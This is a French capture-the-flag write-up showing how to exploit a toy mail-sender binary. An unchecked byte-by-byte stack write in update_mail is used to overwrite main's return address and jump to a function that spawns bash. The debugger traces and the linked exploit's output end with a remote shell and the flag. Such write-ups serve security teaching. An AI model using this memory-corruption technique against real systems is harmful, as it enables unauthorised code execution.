# Pwn0x02

```md
send a mail wherever you want!

nc 35.180.44.229 1236
```

[L'exécutable](./task) est fournit vérifions si des sécurités sont activées :

```console
$ checksec --file=task
[*] '/home/geoffrey/Documents/Campus/Star-Hack/Pwn0x02/task'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Toujours pas de PIE ou de canary. Essayons de le lancer :

```console
$ ./task 
MAIL SENDER v0.1.5
1) create new mail
2) update mail content
3) send mail
>> 1
>> AAAA
1) create new mail
2) update mail content
3) send mail
>> 3
mail is sent! quitting now.
```

Le programme nous demande de multiples entrées, essayons de voir si l'une d'entre elles sont vulnérables.

## Analyse statique

Je ne vais pas montrer tout le code source, mais uniquement ces deux fonctions :

```C
void mailshell(void)
{
  execve("/bin/bash",(char **)0x0,(char **)0x0);
  return;
}
```

```C
undefined8 update_mail(long param_1)
{
  long len;
  undefined input [4];
  
  printf(">> ");
  __isoc99_scanf(&DECIMAL_INPUT,input);
  len = (long)length;
  length = length + 1;
  *(undefined *)(param_1 + len) = input[0];
  return 0;
}
```

La première est évidemment la fonction vers laquelle nous voulons rediriger le programme pour obtenir un shell.

Dans la seconde, ce bout de code semble un peu étrange :

```C
  len = (long)length;
  length = length + 1;
  *(undefined *)(param_1 + len) = input[0];
```

Visiblement il pourrait nous permettre d'écrire dans la mémoire. Allons voir ce qu'il se passe concrètement dans ce code.

## Analyse dynamique

Analysons ce bout de code sous GDB :

```gdb
gef➤  disas update_mail 
Dump of assembler code for function update_mail:
   0x000000000040128d <+0>:	endbr64
   0x0000000000401291 <+4>:	push   rbp
   0x0000000000401292 <+5>:	mov    rbp,rsp
   0x0000000000401295 <+8>:	sub    rsp,0x20
   0x0000000000401299 <+12>:	mov    QWORD PTR [rbp-0x18],rdi
   0x000000000040129d <+16>:	lea    rdi,[rip+0xd6a]        # 0x40200e
   0x00000000004012a4 <+23>:	mov    eax,0x0
   0x00000000004012a9 <+28>:	call   0x4010d0 <printf@plt>
   0x00000000004012ae <+33>:	lea    rax,[rbp-0x4]
   0x00000000004012b2 <+37>:	mov    rsi,rax
   0x00000000004012b5 <+40>:	lea    rdi,[rip+0xd56]        # 0x402012
   0x00000000004012bc <+47>:	mov    eax,0x0
   0x00000000004012c1 <+52>:	call   0x401110 <__isoc99_scanf@plt>
   0x00000000004012c6 <+57>:	mov    ecx,DWORD PTR [rbp-0x4]
   0x00000000004012c9 <+60>:	mov    eax,DWORD PTR [rip+0x2d99]        # 0x404068 <length>
   0x00000000004012cf <+66>:	lea    edx,[rax+0x1]
   0x00000000004012d2 <+69>:	mov    DWORD PTR [rip+0x2d90],edx        # 0x404068 <length>
   0x00000000004012d8 <+75>:	movsxd rdx,eax
   0x00000000004012db <+78>:	mov    rax,QWORD PTR [rbp-0x18]
   0x00000000004012df <+82>:	add    rax,rdx
   0x00000000004012e2 <+85>:	mov    edx,ecx
   0x00000000004012e4 <+87>:	mov    BYTE PTR [rax],dl
   0x00000000004012e6 <+89>:	mov    eax,0x0
   0x00000000004012eb <+94>:	leave
   0x00000000004012ec <+95>:	ret
End of assembler dump.

gef➤  br *update_mail+87
Breakpoint 1 at 0x4012e4

gef➤  r
Starting program: /home/geoffrey/Documents/Campus/Star-Hack/Pwn0x02/task 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
MAIL SENDER v0.1.5
1) create new mail
2) update mail content
3) send mail
>> 2
>> 0
```

Allons directement sur l'instructions `mov    BYTE PTR [rax],dl` qui est celle qui nous permettra d'écrire sur la mémoire :

```gdb
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdc40  →  0x00007fffffffdce0  →  0x00007fffffffdd40  →  0x0000000000000000
$rbx   : 0x00007fffffffdd68  →  0x00007fffffffe0d7  →  "/home/geoffrey/Documents/Campus/Star-Hack/Pwn0x02/[...]"
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007fffffffdbd0  →  0x00007fffffffdbf0  →  0x00007fffffffdc40  →  0x00007fffffffdce0  →  0x00007fffffffdd40  →  0x0000000000000000
$rbp   : 0x00007fffffffdbf0  →  0x00007fffffffdc40  →  0x00007fffffffdce0  →  0x00007fffffffdd40  →  0x0000000000000000
$rsi   : 0x0               
$rdi   : 0x00007fffffffd690  →  0x00007fffffff0030  →  0x0000000000000000
$rip   : 0x00000000004012e4  →  <update_mail+0057> mov BYTE PTR [rax], dl
$r8    : 0xa               
$r9    : 0x0               
$r10   : 0x00007ffff7f4dfe0  →  0x0000000100000000
$r11   : 0x00007ffff7f4e8e0  →  0x0002000200020002
$r12   : 0x1               
$r13   : 0x0               
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000000000000000
$r15   : 0x0               
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdbd0│+0x0000: 0x00007fffffffdbf0  →  0x00007fffffffdc40  →  0x00007fffffffdce0  →  0x00007fffffffdd40  →  0x0000000000000000	 ← $rsp
0x00007fffffffdbd8│+0x0008: 0x00007fffffffdc00  →  0x0000000000000000
0x00007fffffffdbe0│+0x0010: 0x00007fffffffdbf0  →  0x00007fffffffdc40  →  0x00007fffffffdce0  →  0x00007fffffffdd40  →  0x0000000000000000
0x00007fffffffdbe8│+0x0018: 0x000000000040136e  →  <menu+002c> nop 
0x00007fffffffdbf0│+0x0020: 0x00007fffffffdc40  →  0x00007fffffffdce0  →  0x00007fffffffdd40  →  0x0000000000000000	 ← $rbp
0x00007fffffffdbf8│+0x0028: 0x00000000004014ab  →  <main+00b2> jmp 0x4014c9 <main+208>
0x00007fffffffdc00│+0x0030: 0x0000000000000000
0x00007fffffffdc08│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4012db <update_mail+004e> mov    rax, QWORD PTR [rbp-0x18]
     0x4012df <update_mail+0052> add    rax, rdx
     0x4012e2 <update_mail+0055> mov    edx, ecx
●→   0x4012e4 <update_mail+0057> mov    BYTE PTR [rax], dl
     0x4012e6 <update_mail+0059> mov    eax, 0x0
     0x4012eb <update_mail+005e> leave  
     0x4012ec <update_mail+005f> ret    
     0x4012ed <send_mail+0000> endbr64 
     0x4012f1 <send_mail+0004> push   rbp
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "task", stopped 0x4012e4 in update_mail (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4012e4 → update_mail()
[#1] 0x4014ab → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

gef➤  tele -l16
0x00007fffffffdbd0│+0x0000: 0x00007fffffffdbf0  →  0x00007fffffffdc40  →  0x00007fffffffdce0  →  0x00007fffffffdd40  →  0x0000000000000000	 ← $rsp
0x00007fffffffdbd8│+0x0008: 0x00007fffffffdc00  →  0x0000000000000000
0x00007fffffffdbe0│+0x0010: 0x00007fffffffdbf0  →  0x00007fffffffdc40  →  0x00007fffffffdce0  →  0x00007fffffffdd40  →  0x0000000000000000
0x00007fffffffdbe8│+0x0018: 0x000000000040136e  →  <menu+002c> nop 
0x00007fffffffdbf0│+0x0020: 0x00007fffffffdc40  →  0x00007fffffffdce0  →  0x00007fffffffdd40  →  0x0000000000000000	 ← $rbp
0x00007fffffffdbf8│+0x0028: 0x00000000004014ab  →  <main+00b2> jmp 0x4014c9 <main+208>
0x00007fffffffdc00│+0x0030: 0x0000000000000000
0x00007fffffffdc08│+0x0038: 0x0000000000000000
0x00007fffffffdc10│+0x0040: 0x0000000000000000
0x00007fffffffdc18│+0x0048: 0x0000000000000000
0x00007fffffffdc20│+0x0050: 0x0000000000000000
0x00007fffffffdc28│+0x0058: 0x0000000000000000
0x00007fffffffdc30│+0x0060: 0x0000000000000000
0x00007fffffffdc38│+0x0068: 0x0000000000000000
0x00007fffffffdc40│+0x0070: 0x00007fffffffdce0  →  0x00007fffffffdd40  →  0x0000000000000000	 ← $rax
0x00007fffffffdc48│+0x0078: 0x00007ffff7de1088  →  <__libc_start_call_main+0078> mov edi, eax
```

Nous sommes donc en train d'écrire par dessus le byte à l'adresse `0x00007fffffffdc40`. Réessayons d'écrire un byte pour voir ce qu'il se passe :

```gdb
gef➤  c
Continuing.
1) create new mail
2) update mail content
3) send mail
>> 2
>> 0

Breakpoint 1, 0x00000000004012e4 in update_mail ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fffffffdc41  →  0x8800007fffffffdc
$rbx   : 0x00007fffffffdd68  →  0x00007fffffffe0d7  →  "/home/geoffrey/Documents/Campus/Star-Hack/Pwn0x02/[...]"
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007fffffffdbd0  →  0x00007fffffffdbf0  →  0x00007fffffffdc40  →  0x00007fffffffdc00  →  0x0000000000000000
$rbp   : 0x00007fffffffdbf0  →  0x00007fffffffdc40  →  0x00007fffffffdc00  →  0x0000000000000000
$rsi   : 0x0               
$rdi   : 0x00007fffffffd690  →  0x00007fffffff0030  →  0x0000000000000000
$rip   : 0x00000000004012e4  →  <update_mail+0057> mov BYTE PTR [rax], dl
$r8    : 0xa               
$r9    : 0x0               
$r10   : 0x00007ffff7f4dfe0  →  0x0000000100000000
$r11   : 0x00007ffff7f4e8e0  →  0x0002000200020002
$r12   : 0x1               
$r13   : 0x0               
$r14   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000000000000000
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdbd0│+0x0000: 0x00007fffffffdbf0  →  0x00007fffffffdc40  →  0x00007fffffffdc00  →  0x0000000000000000	 ← $rsp
0x00007fffffffdbd8│+0x0008: 0x00007fffffffdc00  →  0x0000000000000000
0x00007fffffffdbe0│+0x0010: 0x00007fffffffdbf0  →  0x00007fffffffdc40  →  0x00007fffffffdc00  →  0x0000000000000000
0x00007fffffffdbe8│+0x0018: 0x000000000040136e  →  <menu+002c> nop 
0x00007fffffffdbf0│+0x0020: 0x00007fffffffdc40  →  0x00007fffffffdc00  →  0x0000000000000000	 ← $rbp
0x00007fffffffdbf8│+0x0028: 0x00000000004014ab  →  <main+00b2> jmp 0x4014c9 <main+208>
0x00007fffffffdc00│+0x0030: 0x0000000000000000
0x00007fffffffdc08│+0x0038: 0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4012db <update_mail+004e> mov    rax, QWORD PTR [rbp-0x18]
     0x4012df <update_mail+0052> add    rax, rdx
     0x4012e2 <update_mail+0055> mov    edx, ecx
●→   0x4012e4 <update_mail+0057> mov    BYTE PTR [rax], dl
     0x4012e6 <update_mail+0059> mov    eax, 0x0
     0x4012eb <update_mail+005e> leave  
     0x4012ec <update_mail+005f> ret    
     0x4012ed <send_mail+0000> endbr64 
     0x4012f1 <send_mail+0004> push   rbp
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "task", stopped 0x4012e4 in update_mail (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4012e4 → update_mail()
[#1] 0x4014ab → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Cette fois nous écrivons sur le byte suivant, à l'adresse `0x00007fffffffdc41`. En relisant le code, et en continuant de tester le programme, on comprends que celui-ci nous permet d'écrire byte par byte par dessus la mémoire à partir de l'adresse `0x00007fffffffdc40`. Pour utiliser cette vulnérabilité il nous faut une adresse dans la stack après `0x00007fffffffdc40`, qui une fois modifié nous permettra de rediriger le programme.

Un peu plus haut nous avons cette adresse dans la stack qui pourrait être intéressante :

```gdb
0x00007fffffffdc48│+0x0078: 0x00007ffff7de1088  →  <__libc_start_call_main+0078> mov edi, eax
```

Cela ressemble à une adresse que la fonction `main` pourrait utiliser quand le programme s'arrête, et en explorant le programme on voit que c'est bien le cas :

```gdb
gef➤  x/i *main+227
=> 0x4014dc <main+227>:	ret

gef➤  br *main+227
Breakpoint 2 at 0x4014dc

gef➤  r
Starting program: /home/geoffrey/Documents/Campus/Star-Hack/Pwn0x02/task 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
MAIL SENDER v0.1.5
1) create new mail
2) update mail content
3) send mail
>> 3
mail is sent! quitting now.
```

```gdb
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdc48│+0x0000: 0x00007ffff7de1088  →  <__libc_start_call_main+0078> mov edi, eax	 ← $rsp
0x00007fffffffdc50│+0x0008: 0x00007fffffffdc90  →  0x00007ffff7ffd000  →  0x00007ffff7ffe2e0  →  0x0000000000000000
0x00007fffffffdc58│+0x0010: 0x00007fffffffdd68  →  0x00007fffffffe0d7  →  "/home/geoffrey/Documents/Campus/Star-Hack/Pwn0x02/[...]"
0x00007fffffffdc60│+0x0018: 0x0000000100400040 ("@"?)
0x00007fffffffdc68│+0x0020: 0x00000000004013f9  →  <main+0000> endbr64 
0x00007fffffffdc70│+0x0028: 0x00007fffffffdd68  →  0x00007fffffffe0d7  →  "/home/geoffrey/Documents/Campus/Star-Hack/Pwn0x02/[...]"
0x00007fffffffdc78│+0x0030: 0xa4c0a0fbfba941db
0x00007fffffffdc80│+0x0038: 0x0000000000000001
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4014d5 <main+00dc>      nop    
     0x4014d6 <main+00dd>      mov    eax, 0x0
     0x4014db <main+00e2>      leave  
●→   0x4014dc <main+00e3>      ret    
   ↳  0x7ffff7de1088 <__libc_start_call_main+0078> mov    edi, eax
      0x7ffff7de108a <__libc_start_call_main+007a> call   0x7ffff7dfa450 <__GI_exit>
      0x7ffff7de108f <__libc_start_call_main+007f> call   0x7ffff7e4b340 <__GI___nptl_deallocate_tsd>
      0x7ffff7de1094 <__libc_start_call_main+0084> lock   sub DWORD PTR [rip+0x1bd034], 0x1        # 0x7ffff7f9e0d0 <__nptl_nthreads>
      0x7ffff7de109c <__libc_start_call_main+008c> je     0x7ffff7de10b8 <__libc_start_call_main+168>
      0x7ffff7de109e <__libc_start_call_main+008e> mov    edx, 0x3c
```

En utilisant la vulérabilité dans `update_mail` pour réecrire par dessus `0x00007fffffffdc80` on peut donc rediriger l'exécution du programme.

## Exploit

Cette étape pourrait être faite manuellement en écrivant par dessus 8 bytes pour atteindre `0x00007fffffffdc80`, puis l'adresse de `mailshell` que l'on veut atteindre, mais j'ai écrit un script vu que perdre du temps en ctf est une bonne idée. À noter que `update_mail` interprète l'input en tant que valeur décimale :

```C
__isoc99_scanf(&DECIMAL_INPUT,input);
```

```md
                         DECIMAL_INPUT                             
                                                                                
      00402012 25            ??        25h    %
      00402013 64            ??        64h    d
      00402014 00            ??        00h
```

Il faut donc injecter les valeurs décimales des bytes voulues comme par exemple 15 pour 0x0f :

```python
>>> 0x0f
15
```

[Ce script](./exploit.py) nous permet donc de mettre en forme :

```console
$ python3 exploit.py 
[+] Opening connection to 35.180.44.229 on port 1236: Done
[*] Switching to interactive mode
$ whoami
yogosha

$ ls
flag.txt
task
ynetd

$ cat flag.txt
StarHack{do_n0t_ev3r_trUsT_u5eR_1npUt_hayatflgh}
```